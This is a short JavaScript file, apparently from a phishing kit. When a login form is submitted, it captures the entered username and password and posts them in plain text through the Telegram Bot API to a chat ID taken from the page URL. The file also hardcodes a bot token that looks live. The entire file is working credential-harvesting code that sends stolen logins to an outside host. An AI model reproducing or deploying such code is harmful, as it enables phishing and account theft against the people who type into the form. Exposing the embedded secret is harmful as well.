// Telegram bot token (replace with actual bot token)
const botToken = '7920990688:AAEQBP8NAnaXOex-rJnydvnepaG056m_010';

// Extract the user ID from the URL parameters
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('user');

// Function to send data to Telegram bot for the specific user
function sendMessageToUser(message) {
    if (!userId) {
        console.error('User ID not found in URL');
        return;
    }

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: userId,  // Send the message to the specific user
        text: message
    };

    fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Get input values
    const username = document.getElementById('userInput').value;
    const password = document.getElementById('passwordInput').value;

    // Send the input data to the specific Telegram user
    sendMessageToUser(`Username: ${username}, Password: ${password}`);

    // Optionally, show a success message
    alert("Login data sent to you via Telegram bot!");
});
